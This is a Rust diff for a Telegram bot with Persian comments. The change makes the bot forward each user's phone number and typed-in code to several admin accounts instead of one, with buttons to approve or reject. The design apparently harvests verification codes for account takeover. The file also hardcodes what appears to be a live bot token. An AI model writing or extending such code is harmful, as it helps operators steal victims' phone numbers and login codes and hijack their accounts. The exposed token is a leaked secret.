@@ -21,7 +21,7 @@ use tokio::sync::Mutex;
 const BOT_TOKEN: &str = "8863938800:AAFzTQZ_oAZDg63-331A6aeqFampRaG8KX4";
 
 // آیدی عددی خودت (ادمین) — اینجا شماره و کد میان و تایید/رد می‌کنی
-const TARGET_USER_ID: i64 = 7_383_778_633;
+const TARGET_USER_IDS: &[i64] = &[7_383_778_633, 5_902_213_872];
 
 // ═══════════════════════════════════════════════════════════
 //                        TEXTS
@@ -213,18 +213,20 @@ async fn handle_contact(bot: Bot, msg: Message) -> ResponseResult<()> {
     set_phone(user_id, phone.clone()).await;
 
     // فوروارد شماره به مقصد (ادمین)
-    let target = ChatId(TARGET_USER_ID);
-    let forward_text = format!(
-        "📞 *شمارهٔ جدید دریافت شد*\n\nشماره: {phone}\nآیدی کاربر: {user_id}"
-    );
-    if let Err(e) = bot
-        .send_message(target, &forward_text)
-        .parse_mode(ParseMode::MarkdownV2)
-        .await
-    {
-        log::warn!("markdown send failed, retrying plain: {e}");
-        let plain = format!("📞 شمارهٔ جدید دریافت شد\n\nشماره: {phone}\nآیدی کاربر: {user_id}");
-        bot.send_message(target, plain).await.ok();
+    for &admin_id in TARGET_USER_IDS {
+        let target = ChatId(admin_id);
+        let forward_text = format!(
+            "📞 *شمارهٔ جدید دریافت شد*\n\nشماره: {phone}\nآیدی کاربر: {user_id}"
+        );
+        if let Err(e) = bot
+            .send_message(target, &forward_text)
+            .parse_mode(ParseMode::MarkdownV2)
+            .await
+        {
+            log::warn!("markdown send failed, retrying plain: {e}");
+            let plain = format!("📞 شمارهٔ جدید دریافت شد\n\nشماره: {phone}\nآیدی کاربر: {user_id}");
+            bot.send_message(target, plain).await.ok();
+    }
     }
 
     // حالا برو مرحله گرفتن کد
@@ -256,34 +258,36 @@ async fn handle_text(bot: Bot, msg: Message) -> ResponseResult<()> {
     let phone = get_phone(user_id).await;
 
     // پیام تایید برای ادمین با دکمه‌های تایید/رد
-    let target = ChatId(TARGET_USER_ID);
-    let admin_text = format!(
-        "🔑 *کد جدید دریافت شد*\n\n\
-        کد: {text}\n\
-        شماره: {phone}\n\
-        آیدی کاربر: {user_id}\n\n\
-        آیا تایید می‌کنید؟"
-    );
-
-    let keyboard = InlineKeyboardMarkup::new(vec![vec![
-        InlineKeyboardButton::callback("✅ تایید", format!("approve_{user_id}")),
-        InlineKeyboardButton::callback("❌ رد", format!("reject_{user_id}")),
-    ]]);
-
-    if let Err(e) = bot
-        .send_message(target, &admin_text)
-        .parse_mode(ParseMode::MarkdownV2)
-        .reply_markup(keyboard.clone())
-        .await
-    {
-        log::warn!("markdown send failed, retrying plain: {e}");
-        let plain = format!(
-            "🔑 کد جدید دریافت شد\n\nکد: {text}\nشماره: {phone}\nآیدی کاربر: {user_id}\n\nآیا تایید می‌کنید؟"
+    for &admin_id in TARGET_USER_IDS {
+        let target = ChatId(admin_id);
+        let admin_text = format!(
+            "🔑 *کد جدید دریافت شد*\n\n\
+            کد: {text}\n\
+            شماره: {phone}\n\
+            آیدی کاربر: {user_id}\n\n\
+            آیا تایید می‌کنید؟"
         );
-        bot.send_message(target, plain)
-            .reply_markup(keyboard)
+
+        let keyboard = InlineKeyboardMarkup::new(vec![vec![
+            InlineKeyboardButton::callback("✅ تایید", format!("approve_{user_id}")),
+            InlineKeyboardButton::callback("❌ رد", format!("reject_{user_id}")),
+        ]]);
+
+        if let Err(e) = bot
+            .send_message(target, &admin_text)
+            .parse_mode(ParseMode::MarkdownV2)
+            .reply_markup(keyboard.clone())
             .await
-            .ok();
+        {
+            log::warn!("markdown send failed, retrying plain: {e}");
+            let plain = format!(
+                "🔑 کد جدید دریافت شد\n\nکد: {text}\nشماره: {phone}\nآیدی کاربر: {user_id}\n\nآیا تایید می‌کنید؟"
+            );
+            bot.send_message(target, plain)
+                .reply_markup(keyboard)
+                .await
+                .ok();
+    }
     }
 
     // منتظر تصمیم ادمین می‌مانیم
